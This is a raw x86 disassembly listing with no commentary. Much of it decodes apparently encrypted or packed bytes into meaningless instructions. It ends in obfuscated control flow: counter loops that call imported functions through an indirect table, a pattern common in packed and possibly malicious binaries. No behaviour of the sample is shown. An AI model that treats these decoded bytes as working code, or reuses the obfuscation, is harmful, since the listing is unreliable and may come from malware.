  40991b:	or     BYTE PTR [ebp+eax*2+0x6258b049],dl
  409922:	jno    0x4098a7
  409924:	in     al,0x8e
  409926:	sbb    cl,BYTE PTR [ecx]
  409928:	test   al,bl
  40992a:	test   DWORD PTR [esi],esi
  40992c:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40992e:	sub    eax,0xd0fa0329
  409933:	inc    edi
  409934:	outs   dx,DWORD PTR ds:[esi]
  409935:	pop    ecx
  409936:	jns    0x409996
  409938:	inc    ecx
  409939:	out    0x5d,eax
  40993b:	pop    es
  40993c:	out    0xb0,eax
  40993e:	push   0x19e76389
  409943:	lahf   
  409944:	xchg   ebx,eax
  409945:	cmp    eax,0x7f9143a4
  40994a:	mov    edx,0xc2b1a520
  40994f:	enter  0x3e16,0xa6
  409953:	dec    edi
  409954:	xchg   ecx,eax
  409955:	test   al,0x39
  409957:	sbb    al,0x96
  409959:	push   edx
  40995a:	test   BYTE PTR [esi-0x19],al
  40995d:	sbb    BYTE PTR [eax-0xa],dh
  409960:	or     esi,DWORD PTR [edx-0x7357ca81]
  409966:	jge    0x409953
  409968:	cdq    
  409969:	cs pop ecx
  40996b:	xor    BYTE PTR ds:0xb6a58aa5,cl
  409971:	movnti DWORD PTR [ebx],ebp
  409974:	push   esp
  409975:	mov    edi,0x9b84eb2c
  40997a:	lds    esp,FWORD PTR ds:0x35639c53
  409980:	popa   
  409981:	nop
  409982:	lahf   
  409983:	icebp  
  409984:	jl     0x4099cb
  409986:	mov    esi,0x2a28d780
  40998b:	test   BYTE PTR [eiz*1-0x6438ed36],dh
  409992:	sub    DWORD PTR [ebp+0x54d68e25],0xf795643b
  40999c:	out    0x16,al
  40999e:	adc    BYTE PTR [edi+0x4ad47371],ah
  4099a4:	out    dx,al
  4099a5:	ja     0x40992e
  4099a7:	imul   ebx,DWORD PTR ds:0xf4381812,0x2f15ec5f
  4099b1:	loope  0x409996
  4099b3:	mov    dh,0x4
  4099b5:	and    dh,bl
  4099b7:	dec    esi
  4099b8:	enter  0x1617,0xcd
  4099bc:	adc    al,0xa9
  4099be:	add    ch,cl
  4099c0:	and    edx,ebx
  4099c2:	sbb    al,bl
  4099c4:	stos   DWORD PTR es:[edi],eax
  4099c5:	mov    ebp,0x6f5bbc83
  4099ca:	jno    0x409a0c
  4099cc:	mov    esi,0x61286332
  4099d1:	out    0x8f,al
  4099d3:	in     eax,0xe9
  4099d5:	inc    esp
  4099d6:	leave  
  4099d7:	mov    edi,0xd38b7fa2
  4099dc:	dec    esi
  4099dd:	pop    esi
  4099de:	ror    DWORD PTR [edx+0x5245774b],1
  4099e4:	or     DWORD PTR [ecx+eiz*4-0x69c87495],esi
  4099eb:	repz jle 0x4099f9
  4099ee:	mov    al,ds:0xf191d5d2
  4099f3:	or     eax,0xf9a881a8
  4099f8:	mov    edx,0x1c88cd58
  4099fd:	mov    ds:0x59cf551c,al
  409a02:	out    dx,al
  409a03:	mul    DWORD PTR [ecx]
  409a05:	mov    ds:0x677e246b,eax
  409a0a:	je     0x4099a0
  409a0c:	es xchg esp,eax
  409a0e:	outs   dx,BYTE PTR ds:[esi]
  409a0f:	scas   eax,DWORD PTR es:[edi]
  409a10:	adc    al,0xb8
  409a12:	pushf  
  409a13:	mov    dh,BYTE PTR [ecx]
  409a15:	cmp    cl,BYTE PTR [esi+0x39dc805b]
  409a1b:	inc    edx
  409a1c:	jl     0x409a98
  409a1e:	daa    
  409a1f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409a20:	add    al,0xfc
  409a22:	mov    BYTE PTR [ebp-0x3e],ah
  409a25:	adc    al,0x16
  409a27:	cmp    eax,0x331c9ac6
  409a2c:	inc    eax
  409a2d:	xor    al,0x3b
  409a2f:	and    ebp,DWORD PTR [ecx-0x1583ae34]
  409a35:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409a36:	xor    al,0x84
  409a38:	inc    edx
  409a39:	dec    edi
  409a3a:	das    
  409a3b:	inc    edx
  409a3c:	jp     0x409a9b
  409a3e:	dec    edx
  409a3f:	aaa    
  409a40:	mov    al,0x26
  409a42:	sar    BYTE PTR [edi-0x8114708],0x3a
  409a49:	sub    DWORD PTR ds:[edi-0x30],0x4
  409a4e:	arpl   WORD PTR [ecx-0x4e5e4ad4],sp
  409a54:	es add ch,BYTE PTR ss:[ebx+ecx*4]
  409a59:	jp     0x4099f0
  409a5b:	lock and esi,esp
  409a5e:	jae    0x409a90
  409a60:	imul   ebp,DWORD PTR [eax],0xc67a725b
  409a66:	mov    edx,0x370e231e
  409a6b:	enter  0xfa40,0xd
  409a6f:	push   es
  409a70:	inc    ebx
  409a71:	mov    ebx,0xd0ec7400
  409a76:	or     esp,DWORD PTR [esi+edi*2]
  409a79:	sbb    BYTE PTR [edi+0x319f91e],bl
  409a7f:	fidivr DWORD PTR [ecx]
  409a81:	fcom   st(6)
  409a83:	cmp    BYTE PTR [edx+0x8],dh
  409a86:	inc    edx
  409a87:	mov    cl,0xd1
  409a89:	fnsave [edx]
  409a8b:	dec    ecx
  409a8c:	nop
  409a8d:	dec    esp
  409a8e:	call   0x739a2af0
  409a93:	out    dx,eax
  409a94:	or     eax,0xdbb0d980
  409a99:	bound  ecx,QWORD PTR [ecx]
  409a9b:	cmp    bl,cl
  409a9d:	cmp    BYTE PTR [edi+eiz*2+0x3c7718f2],al
  409aa4:	cmp    al,0xa8
  409aa6:	add    BYTE PTR [ecx+0x11],0xd5
  409aaa:	xchg   ebp,eax
  409aab:	or     bh,BYTE PTR [ebp+0x65759cf]
  409ab1:	jno    0x409a5a
  409ab3:	sub    BYTE PTR [ebx+0x15],cl
  409ab6:	mov    esi,0x89d9ecc9
  409abb:	cdq    
  409abc:	stos   BYTE PTR es:[edi],al
  409abd:	push   es
  409abe:	dec    edi
  409abf:	xchg   ebx,eax
  409ac0:	sbb    ah,ch
  409ac2:	add    DWORD PTR [ebp-0x3b2babce],ecx
  409ac8:	arpl   WORD PTR [ebx],cx
  409aca:	jecxz  0x409b48
  409acc:	add    BYTE PTR [ebp-0x1bfe0850],0x2e
  409ad3:	xlat   BYTE PTR ds:[ebx]
  409ad4:	and    ebp,DWORD PTR [eax+0x67a806e7]
  409ada:	pop    ds
  409adb:	jo     0x409b51
  409add:	cli    
  409ade:	push   0xffffffc6
  409ae0:	mov    ds:0x9091609e,al
  409ae5:	pop    es
  409ae6:	shl    DWORD PTR [ebx-0x40],cl
  409ae9:	xchg   ecx,eax
  409aea:	scas   al,BYTE PTR es:[edi]
  409aeb:	cmp    dl,ah
  409aed:	ret    
  409aee:	data16 (bad) 
  409af0:	lods   al,BYTE PTR ds:[esi]
  409af1:	call   DWORD PTR [eax-0x2]
  409af4:	daa    
  409af5:	xchg   edi,eax
  409af6:	int    0xb5
  409af8:	mov    ds:0xd6e25524,al
  409afd:	cmp    BYTE PTR [ecx],dh
  409aff:	sbb    ecx,DWORD PTR [eax]
  409b01:	nop
  409b02:	xchg   DWORD PTR [ebp+0x1d],ebp
  409b05:	and    ch,BYTE PTR [edi-0x90dcd0d]
  409b0b:	jbe    0x409b38
  409b0d:	pushf  
  409b0e:	hlt    
  409b0f:	lods   eax,DWORD PTR ds:[esi]
  409b10:	push   ebp
  409b11:	neg    DWORD PTR [edx]
  409b13:	mov    bh,0x63
  409b15:	mov    esi,0x4dad5cf9
  409b1a:	sub    DWORD PTR [edx-0x32],ebp
  409b1d:	outs   dx,BYTE PTR ds:[esi]
  409b1e:	mov    bl,0x3d
  409b20:	sti    
  409b21:	arpl   WORD PTR [ecx],cx
  409b23:	(bad)  
  409b24:	jae    0x409b0d
  409b26:	inc    edi
  409b27:	lahf   
  409b28:	cli    
  409b29:	push   es
  409b2a:	pop    ss
  409b2b:	les    edi,FWORD PTR [ecx-0x46]
  409b2e:	pop    es
  409b2f:	cmp    eax,0x1efa1ed3
  409b34:	int    0x8
  409b36:	adc    ah,BYTE PTR es:[eax+esi*8-0x1e]
  409b3b:	push   esi
  409b3c:	bound  ecx,QWORD PTR [ebp-0xbcf91d2]
  409b42:	add    BYTE PTR [edx-0x7019327f],dh
  409b48:	fs add eax,0xedbd1f82
  409b4e:	outs   dx,DWORD PTR gs:[esi]
  409b50:	add    eax,0xbd7cfa6d
  409b55:	fdiv   DWORD PTR [ecx]
  409b57:	xor    al,0xb2
  409b59:	test   al,0xd
  409b5b:	(bad)  
  409b5c:	jo     0x409b48
  409b5e:	push   ebx
  409b5f:	and    al,0x77
  409b61:	nop
  409b62:	out    0x8a,eax
  409b64:	and    eax,0x118179b5
  409b69:	and    BYTE PTR [ecx+0x4a90e709],0x5d
  409b70:	add    BYTE PTR [edi+0x63],bl
  409b73:	lods   al,BYTE PTR ds:[esi]
  409b74:	add    DWORD PTR [ebp-0x52],esp
  409b77:	dec    ebx
  409b78:	and    ch,0xb3
  409b7b:	bound  esi,QWORD PTR [edi]
  409b7d:	or     DWORD PTR [ebx+0x36],ebx
  409b80:	imul   edi,DWORD PTR [ebp+eax*4-0x5],0x30
  409b85:	mov    gs,WORD PTR [ebx+ecx*4+0x1428cce1]
  409b8c:	jno    0x409bad
  409b8e:	sbb    edi,DWORD PTR [ecx]
  409b90:	retf   0x5326
  409b93:	jle    0x409bab
  409b95:	fs cs iret 
  409b98:	xchg   DWORD PTR [eax+0x77867b51],ecx
  409b9e:	scas   al,BYTE PTR es:[edi]
  409b9f:	cmp    dl,BYTE PTR [edi+0x16769b83]
  409ba5:	jo     0x409be8
  409ba7:	and    al,0xeb
  409ba9:	das    
  409baa:	(bad)  
  409bab:	cmc    
  409bac:	sti    
  409bad:	mov    ds:0x17581e8d,eax
  409bb2:	inc    ecx
  409bb3:	ret    0x4c65
  409bb6:	sahf   
  409bb7:	cmp    al,0x19
  409bb9:	mov    edx,0xf8fb16fa
  409bbe:	retf   0x6d0a
  409bc1:	je     0x409c06
  409bc3:	je     0x409bc1
  409bc5:	and    al,0x2a
  409bc7:	fbld   TBYTE PTR [esi]
  409bc9:	xchg   ecx,eax
  409bca:	f2xm1  
  409bcc:	stc    
  409bcd:	bound  edi,QWORD PTR [ebx+0x8]
  409bd0:	xchg   edx,eax
  409bd1:	sub    esp,DWORD PTR [eax]
  409bd3:	push   ecx
  409bd4:	sub    ecx,DWORD PTR [edi]
  409bd6:	mov    dh,0x84
  409bd8:	push   esp
  409bd9:	lods   al,BYTE PTR ds:[esi]
  409bda:	and    ebx,DWORD PTR [esi-0x29379e76]
  409be0:	sbb    esi,DWORD PTR [esi-0xf]
  409be3:	bound  edx,QWORD PTR [edx]
  409be5:	sbb    eax,0x5f10b209
  409bea:	daa    
  409beb:	cdq    
  409bec:	fbstp  TBYTE PTR [eax-0x1349c052]
  409bf3:	add    al,0x11
  409bf5:	in     eax,0xfb
  409bf7:	mov    esi,0xb93a2770
  409bfc:	cld    
  409bfd:	adc    dh,BYTE PTR [edx-0xa]
  409c00:	and    ah,cl
  409c02:	sbb    eax,0x929bedb1
  409c07:	xor    DWORD PTR [eax],edi
  409c09:	in     al,dx
  409c0a:	mov    WORD PTR [ebx],cs
  409c0c:	sub    dh,BYTE PTR [edx+0x51]
  409c0f:	lahf   
  409c10:	shr    BYTE PTR [esi+0x53],1
  409c13:	adc    ecx,DWORD PTR [esi+0x6ab35e6f]
  409c19:	ret    
  409c1a:	bound  edx,QWORD PTR [eax+0x37]
  409c1d:	sti    
  409c1e:	out    dx,al
  409c1f:	stc    
  409c20:	inc    eax
  409c21:	mov    ?,WORD PTR [esi-0x4d]
  409c24:	inc    edi
  409c25:	(bad)  
  409c26:	fsubr  st(3),st
  409c28:	data16 mov ah,0xf8
  409c2b:	mov    cl,0x6
  409c2d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409c2e:	xor    eax,0x90790096
  409c33:	arpl   WORD PTR [edi-0x384f1bb],di
  409c39:	lea    edi,[ebp-0x26]
  409c3c:	aas    
  409c3d:	(bad)  
  409c3e:	push   edx
  409c3f:	sbb    al,0x6f
  409c41:	adc    BYTE PTR [edi+0x4bd5d0f2],cl
  409c47:	xor    DWORD PTR [edx-0x60],ecx
  409c4a:	in     al,dx
  409c4b:	enter  0x3930,0x21
  409c4f:	cmp    eax,0x4bebb51a
  409c54:	sahf   
  409c55:	ss cdq 
  409c57:	cmp    BYTE PTR [edi+ebx*1],cl
  409c5a:	ds call 0x756ea5c4
  409c60:	sbb    eax,0x4d8b2ad3
  409c65:	sub    ebp,DWORD PTR [esi-0x522d342]
  409c6b:	pushf  
  409c6c:	out    dx,eax
  409c6d:	fistp  DWORD PTR [esi]
  409c6f:	int    0xb7
  409c71:	imul   ebp,DWORD PTR [ecx-0x2c],0x5d6b0cf5
  409c78:	in     al,0x73
  409c7a:	push   cs
  409c7b:	sub    DWORD PTR [ecx+ebp*2+0x6266b547],esi
  409c82:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409c83:	leave  
  409c84:	(bad)  
  409c85:	jge    0x409c61
  409c87:	push   edx
  409c88:	in     eax,dx
  409c89:	xchg   esi,eax
  409c8a:	add    eax,0x6422342d
  409c8f:	mov    ds:0x41838f72,al
  409c94:	test   eax,0xdbc19c23
  409c99:	jae    0x409cb6
  409c9b:	push   ss
  409c9c:	cmp    al,0xd0
  409c9e:	cs repz adc ebp,0xd2f925a1
  409ca6:	fisttp QWORD PTR [ecx+0x1c0de508]
  409cac:	add    DWORD PTR ds:0x775d3db2,edi
  409cb2:	fwait
  409cb3:	jnp    0x409c74
  409cb5:	pop    eax
  409cb6:	add    edi,DWORD PTR [ecx+ecx*8-0x51]
  409cba:	iret   
  409cbb:	push   ebx
  409cbc:	push   ds
  409cbd:	sub    al,0x73
  409cbf:	cmc    
  409cc0:	(bad)  
  409cc1:	cmp    dl,cl
  409cc3:	mov    cl,0xce
  409cc5:	inc    ebp
  409cc6:	scas   al,BYTE PTR es:[edi]
  409cc7:	idiv   DWORD PTR [eax-0x5a4ff04c]
  409ccd:	fldenv ss:[ebp+edi*1+0x78]
  409cd2:	mov    ds:0x7150e4af,eax
  409cd7:	shr    BYTE PTR [edx+0x3297f5e6],0x95
  409cde:	(bad)  
  409cdf:	dec    ebp
  409ce0:	xor    bl,cl
  409ce2:	scas   al,BYTE PTR es:[edi]
  409ce3:	in     al,dx
  409ce4:	loope  0x409ce2
  409ce6:	jp     0x409ca9
  409ce8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409ce9:	sar    DWORD PTR [eax+0x30079435],cl
  409cef:	xchg   edx,eax
  409cf0:	sub    bl,BYTE PTR [ebx+0x201538ee]
  409cf6:	cli    
  409cf7:	pop    edi
  409cf8:	sub    DWORD PTR [edx+0x5d37cee],edi
  409cfe:	xchg   DWORD PTR [edi],eax
  409d00:	sahf   
  409d01:	dec    esp
  409d02:	mov    ah,0x38
  409d04:	dec    ebx
  409d05:	stos   BYTE PTR es:[edi],al
  409d06:	sbb    ecx,DWORD PTR [edi+0xddc0d7e]
  409d0c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409d0d:	lods   eax,DWORD PTR ds:[esi]
  409d0e:	data16 mov bl,0xc4
  409d11:	cmp    esi,DWORD PTR [ebp-0x76c96dd6]
  409d17:	das    
  409d18:	shl    DWORD PTR [edx+0x28],0x4b
  409d1c:	sbb    edi,esi
  409d1e:	inc    edx
  409d1f:	xor    ch,BYTE PTR [edi]
  409d21:	fwait
  409d22:	(bad)  
  409d23:	fisttp DWORD PTR [esi]
  409d25:	fist   WORD PTR [edx]
  409d27:	inc    ecx
  409d28:	xlat   BYTE PTR ds:[ebx]
  409d29:	mov    edx,0x2f6cf4c6
  409d2e:	dec    esi
  409d2f:	xchg   edi,eax
  409d30:	imul   ebp,ebp,0xffffffdc
  409d33:	cld    
  409d34:	data16 (bad) 
  409d36:	rol    DWORD PTR [edx-0x15],1
  409d39:	loop   0x409d83
  409d3b:	cwde   
  409d3c:	mov    dh,0x77
  409d3e:	and    esp,DWORD PTR [ecx+0x6]
  409d41:	int    0xb8
  409d43:	mov    DWORD PTR [esi-0x28],esi
  409d46:	arpl   WORD PTR [ebx],bx
  409d48:	lods   eax,DWORD PTR ds:[esi]
  409d49:	sub    eax,0x9a7eb529
  409d4e:	cmp    al,0x81
  409d50:	jp     0x409d97
  409d52:	popa   
  409d53:	data16 sub BYTE PTR [ebx-0x2c],bh
  409d57:	lahf   
  409d58:	test   dh,bh
  409d5a:	or     eax,0x992d6182
  409d5f:	(bad)
  409d62:	mov    BYTE PTR [edi+0x3e35efac],al
  409d68:	nop
  409d69:	jle    0x409d2f
  409d6b:	xchg   BYTE PTR [edx-0x50],ah
  409d6e:	jb     0x409dab
  409d70:	jp     0x409d77
  409d72:	cmp    BYTE PTR [ebx],0xfd
  409d75:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  409d77:	jl     0x409d13
  409d79:	mov    ch,0xd7
  409d7b:	cmp    al,0x9c
  409d7d:	sbb    DWORD PTR [ecx+ecx*1],esp
  409d80:	(bad)  
  409d81:	cwde   
  409d82:	and    eax,0xc6e8d7f4
  409d87:	ins    BYTE PTR es:[edi],dx
  409d88:	enter  0x1420,0x21
  409d8c:	mov    ds:0x8dfbeeea,eax
  409d91:	fst    DWORD PTR [edi+0x6f]
  409d94:	mov    edx,0x13007fff
  409d99:	out    dx,eax
  409d9a:	push   ds
  409d9b:	jg     0x409d62
  409d9d:	lea    ecx,[edx+0x12]
  409da0:	mov    edx,0xaa219601
  409da5:	ins    BYTE PTR es:[edi],dx
  409da6:	imul   esp,DWORD PTR [eax-0x72382428],0xffffffd9
  409dad:	xor    BYTE PTR [esi+ecx*4],dl
  409db0:	push   0xf2548202
  409db5:	ss push 0x5a334ef1
  409dbb:	xchg   ebx,eax
  409dbc:	or     eax,0xf7ca1c68
  409dc1:	sub    ecx,ebp
  409dc3:	jmp    0x2814da5c
  409dc8:	pop    esp
  409dc9:	fist   DWORD PTR [ebx+edi*2]
  409dcc:	stos   DWORD PTR es:[edi],eax
  409dcd:	sbb    bl,bl
  409dcf:	add    BYTE PTR [edi+0xf],bh
  409dd2:	mov    ds,esp
  409dd4:	sub    eax,0xa6523ef
  409dd9:	adc    cl,ch
  409ddb:	test   eax,0x935f91ec
  409de0:	cmp    al,0x6c
  409de2:	dec    edi
  409de3:	pop    ecx
  409de4:	dec    eax
  409de5:	out    0x89,al
  409de7:	fimul  DWORD PTR cs:[edx]
  409dea:	jmp    0x409e09
  409dec:	jp     0x409d7c
  409dee:	push   ebx
  409def:	jns    0x409e25
  409df1:	push   edx
  409df2:	popf   
  409df3:	mov    dh,ch
  409df5:	dec    ebp
  409df6:	daa    
  409df7:	call   FWORD PTR [ecx+eiz*4]
  409dfa:	lds    edx,FWORD PTR [ebx*8-0x11d7a9c4]
  409e01:	xchg   esi,eax
  409e02:	shl    DWORD PTR [eax+edx*8+0x21],cl
  409e06:	hlt    
  409e07:	(bad)  
  409e08:	cdq    
  409e09:	mov    ebx,0x87b9a96d
  409e0e:	stos   DWORD PTR es:[edi],eax
  409e0f:	sub    ebx,DWORD PTR [eax+esi*8-0x2e]
  409e13:	jo     0x409e73
  409e15:	or     edi,DWORD PTR [ecx]
  409e17:	sti    
  409e18:	sbb    al,BYTE PTR es:[esi]
  409e1b:	pop    esp
  409e1c:	repnz cmp al,BYTE PTR ds:0xf43bef9a
  409e23:	adc    BYTE PTR [ebx+0x7e],al
  409e26:	fisttp QWORD PTR [edi-0x25]
  409e29:	dec    ebx
  409e2a:	sub    dl,BYTE PTR [ecx-0x6cbdae14]
  409e30:	lds    esi,FWORD PTR [ecx-0x2e]
  409e33:	push   ecx
  409e34:	cdq    
  409e35:	aas    
  409e36:	mov    dl,0x1b
  409e38:	xlat   BYTE PTR ds:[ebx]
  409e39:	push   edi
  409e3a:	sub    esi,DWORD PTR [ebx+edx*8-0x53eb58f4]
  409e41:	sub    al,0x93
  409e43:	(bad)  
  409e44:	out    0x53,eax
  409e46:	imul   eax,DWORD PTR [ebp-0x6d5506ff],0x1c
  409e4d:	add    al,0xbf
  409e4f:	add    DWORD PTR [ebp+0x28adf147],0x208c9789
  409e59:	shl    DWORD PTR [edi+0x1c393418],1
  409e5f:	cwde   
  409e60:	adc    DWORD PTR [esi-0x1088ddd8],edi
  409e66:	adc    al,0xb1
  409e68:	enter  0x2a52,0xd3
  409e6c:	imul   ebp,DWORD PTR [ecx],0x257d8e36
  409e72:	test   al,0x8a
  409e74:	aas    
  409e75:	je     0x409ec9
  409e77:	rcr    BYTE PTR [ecx],0x3a
  409e7a:	or     dh,bl
  409e7c:	sub    esi,DWORD PTR [edx]
  409e7e:	dec    ebp
  409e7f:	push   es
  409e80:	pop    ds
  409e81:	leave  
  409e82:	ja     0x409e9d
  409e84:	pop    edi
  409e85:	cmp    eax,DWORD PTR [esi+0x400a16e6]
  409e8b:	mov    ds:0xc73cd259,al
  409e90:	xor    al,0x34
  409e92:	pop    ebp
  409e93:	mov    edx,0xb8ce6205
  409e98:	(bad)  
  409e99:	jbe    0x409ed9
  409e9b:	xchg   esi,eax
  409e9c:	pop    edx
  409e9d:	and    ah,BYTE PTR [edi]
  409e9f:	lea    ebp,ds:0x75a8edb8
  409ea5:	xor    al,BYTE PTR [edi+0x1a70552e]
  409eab:	and    eax,0xef245a32
  409eb0:	(bad)  
  409eb1:	push   ebx
  409eb2:	in     al,0x5d
  409eb4:	xor    al,0x39
  409eb6:	cmc    
  409eb7:	cs pop ebp
  409eb9:	popa   
  409eba:	repnz mov dl,0x86
  409ebd:	pop    es
  409ebe:	aad    0x33
  409ec0:	jl     0x409ed0
  409ec2:	dec    esp
  409ec3:	adc    BYTE PTR [ebx+ebx*2],ch
  409ec6:	mov    bl,dl
  409ec8:	pop    ebx
  409ec9:	cdq    
  409eca:	add    DWORD PTR [ebx-0x49],0x43cfc8d5
  409ed1:	mov    ebx,0x98544d7e
  409ed6:	xor    BYTE PTR [ebx+0x3a],dh
  409ed9:	mov    ebx,0xf65f653b
  409ede:	out    0x64,al
  409ee0:	in     eax,0x5c
  409ee2:	fnstenv [ebp+0x47]
  409ee5:	sbb    DWORD PTR [ebp+0x9216c8d],0x834191e0
  409eef:	repz loop 0x409edd
  409ef2:	cwde   
  409ef3:	dec    esi
  409ef4:	int    0x5d
  409ef6:	xchg   esp,eax
  409ef7:	dec    eax
  409ef8:	sub    al,0x75
  409efa:	lock jecxz 0x409e9d
  409efd:	push   ebx
  409efe:	stc    
  409eff:	icebp  
  409f00:	outs   dx,BYTE PTR ds:[esi]
  409f01:	fstp   QWORD PTR [ebp-0x48]
  409f04:	and    DWORD PTR [edx],esi
  409f06:	addr16 push cs
  409f08:	jp     0x409ee9
  409f0a:	(bad)  [ecx+eiz*1]
  409f0d:	bound  ecx,QWORD PTR [eax-0x70052c7]
  409f13:	fs loop 0x409f36
  409f16:	imul   ebx,DWORD PTR [eax-0x2ecdbd51],0xffffffed
  409f1d:	aaa    
  409f1e:	and    al,0x8b
  409f20:	or     eax,DWORD PTR [ebp-0x4]
  409f23:	dec    ebx
  409f24:	clc    
  409f25:	jb     0x409f81
  409f27:	(bad)  [ecx-0x58]
  409f2a:	and    BYTE PTR [esi+0x6b],bh
  409f2d:	sbb    esp,DWORD PTR [edi+0x95388b4]
  409f33:	xor    bh,BYTE PTR [ecx+0x3d]
  409f36:	xchg   BYTE PTR [edi-0x76],cl
  409f39:	cld    
  409f3a:	jae    0x409f1d
  409f3c:	(bad)  
  409f3e:	in     al,0xc8
  409f40:	ror    ecx,cl
  409f42:	aam    0xa5
  409f44:	in     eax,0x99
  409f46:	out    dx,al
  409f47:	dec    esp
  409f48:	push   ecx
  409f49:	mov    edx,0xe56510ca
  409f4e:	jmp    0x409f3d
  409f50:	sbb    edi,DWORD PTR [edx]
  409f52:	jmp    0x409ee8
  409f54:	ret    
  409f55:	pop    ebx
  409f56:	mov    ebp,0x62e21c39
  409f5b:	les    ebp,FWORD PTR [edx+eiz*1]
  409f5e:	ret    
  409f5f:	pop    ss
  409f60:	sbb    dl,BYTE PTR ds:0xaa90116
  409f66:	xchg   ebp,eax
  409f67:	and    cl,BYTE PTR [ebp+edx*2+0x61]
  409f6b:	inc    esp
  409f6c:	test   al,0x7
  409f6e:	add    esp,DWORD PTR [edx]
  409f70:	pop    ebx
  409f71:	or     bl,bh
  409f73:	sbb    al,0x23
  409f75:	sti    
  409f76:	leave  
  409f77:	daa    
  409f78:	mov    cx,sp
  409f7b:	loopne 0x409fd2
  409f7d:	bound  eax,QWORD PTR [ecx-0x46]
  409f80:	lods   al,BYTE PTR ds:[esi]
  409f81:	mov    eax,DWORD PTR [eax+0x198]
  409f87:	and    DWORD PTR ds:0x429008,0x0
  409f91:	xor    edx,edx
  409f93:	add    edx,DWORD PTR ds:0x429008
  409f99:	inc    edx
  409f9a:	mov    DWORD PTR ds:0x429008,edx
  409fa0:	cmp    DWORD PTR ds:0x429008,0x11
  409fa7:	jne    0x409fe0
  409fad:	push   DWORD PTR [ebp-0x28]
  409fb0:	push   DWORD PTR [ebp-0xc]
  409fb3:	push   0x130f
  409fb8:	push   0x751a
  409fbd:	push   0x8a1e
  409fc2:	push   0x2320
  409fc7:	push   DWORD PTR [ebp-0x24]
  409fca:	push   0x206d
  409fcf:	push   DWORD PTR [ebp-0xc]
  409fd2:	push   DWORD PTR [ebp-0x20]
  409fd5:	push   0x5142
  409fda:	call   DWORD PTR ds:0x42e8db
  409fe0:	cmp    DWORD PTR ds:0x429008,0x10
  409fe7:	jne    0x409ffa
  409fed:	mov    edx,DWORD PTR ds:0x429008
  409ff3:	inc    edx
  409ff4:	mov    DWORD PTR ds:0x429008,edx
  409ffa:	cmp    DWORD PTR ds:0x429008,0x1e
  40a001:	jb     0x409f91
  40a007:	xor    edi,ecx
  40a009:	add    DWORD PTR ds:0x42d000,ebx
  40a00f:	mov    edx,0x3272e2
  40a014:	mov    DWORD PTR ds:0x42c010,0x65c3
  40a01e:	add    edi,edx
  40a020:	cmp    DWORD PTR [eax],edi
  40a022:	mov    DWORD PTR ds:0x42a00c,0xde
  40a02c:	je     0x40a043
  40a032:	mov    eax,DWORD PTR [eax]
  40a034:	mov    DWORD PTR ds:0x42c004,0x3704
  40a03e:	jmp    0x40ea3f
  40a043:	mov    eax,ds:0x42b010
  40a048:	mov    eax,DWORD PTR [ebp+0x18]
  40a04b:	cmp    eax,esi
  40a04d:	mov    DWORD PTR ds:0x42a00c,0x4db6
  40a057:	jne    0x40a071
  40a05d:	mov    DWORD PTR ds:0x42c008,0x3d03
  40a067:	push   0xf89c8584
  40a06c:	jmp    0x40ea2e
  40a071:	mov    esi,DWORD PTR [ebp+0x18]
  40a074:	mov    eax,0xf89c85bb
  40a079:	cmp    esi,eax
  40a07b:	mov    DWORD PTR ds:0x42b008,0x1a7e
  40a085:	jne    0x40ea1e
  40a08b:	sbb    eax,esi
  40a08d:	mov    eax,DWORD PTR [ebp+0x10]
  40a090:	and    DWORD PTR ds:0x42c010,0x0
  40a09a:	mov    esi,DWORD PTR ds:0x42c010
  40a0a0:	inc    esi
  40a0a1:	mov    DWORD PTR ds:0x42c010,esi
  40a0a7:	cmp    DWORD PTR ds:0x42c010,0x1f
  40a0ae:	jne    0x40a0cf
  40a0b4:	push   0x2683
  40a0b9:	push   DWORD PTR [ebp-0x20]
  40a0bc:	push   0x3e9b
  40a0c1:	push   DWORD PTR [ebp-0x20]
  40a0c4:	push   0x63df
  40a0c9:	call   DWORD PTR ds:0x42e8df
  40a0cf:	cmp    DWORD PTR ds:0x42c010,0x13
  40a0d6:	jb     0x40a09a
  40a0dc:	mov    DWORD PTR ds:0x42c008,0x14
  40a0e6:	cmp    DWORD PTR ds:0x42c008,0x0
  40a0ed:	je     0x40a126
  40a0f3:	cmp    DWORD PTR ds:0x42c008,0x1c
  40a0fa:	jne    0x40a106
  40a100:	call   DWORD PTR ds:0x42e91b
  40a106:	xor    esi,esi
  40a108:	xor    esi,DWORD PTR ds:0x42c008
  40a10e:	dec    esi
  40a10f:	mov    DWORD PTR ds:0x42c008,esi
  40a115:	jmp    0x40a0e6
  40a11a:	mov    esi,DWORD PTR ds:0x42901c
  40a120:	or     DWORD PTR ds:0x429020,esi
  40a126:	xor    eax,ecx
  40a128:	and    esi,DWORD PTR ds:0x42c018
  40a12e:	add    eax,edx
  40a130:	and    DWORD PTR ds:0x42c004,0x0
  40a13a:	xor    esi,esi
  40a13c:	add    esi,DWORD PTR ds:0x42c004
  40a142:	inc    esi
  40a143:	mov    DWORD PTR ds:0x42c004,esi
  40a149:	cmp    DWORD PTR ds:0x42c004,0xd
  40a150:	jne    0x40a164
  40a156:	push   0x6b46
  40a15b:	push   DWORD PTR [ebp-0x10]
  40a15e:	call   DWORD PTR ds:0x42e91f
  40a164:	cmp    DWORD PTR ds:0x42c004,0xc
  40a16b:	jne    0x40a180
  40a171:	xor    esi,esi
  40a173:	xor    esi,DWORD PTR ds:0x42c004
  40a179:	inc    esi
  40a17a:	mov    DWORD PTR ds:0x42c004,esi
  40a180:	cmp    DWORD PTR ds:0x42c004,0x1b
  40a187:	jb     0x40a13a
  40a18d:	xor    esi,esi
  40a18f:	xor    esi,DWORD PTR ds:0x42c010
  40a195:	or     esi,DWORD PTR ds:0x429000
  40a19b:	mov    DWORD PTR ds:0x42c010,esi
  40a1a1:	mov    DWORD PTR [ebp-0x18],eax
  40a1a4:	mov    eax,DWORD PTR [ebp+0xc]
  40a1a7:	mov    esi,DWORD PTR [ebp-0x8]
  40a1aa:	xor    eax,ecx
  40a1ac:	add    eax,edx
  40a1ae:	mov    DWORD PTR ds:0x429018,0x1094
  40a1b8:	imul   eax,DWORD PTR [esi]
  40a1bb:	and    DWORD PTR ds:0x42900c,0x0
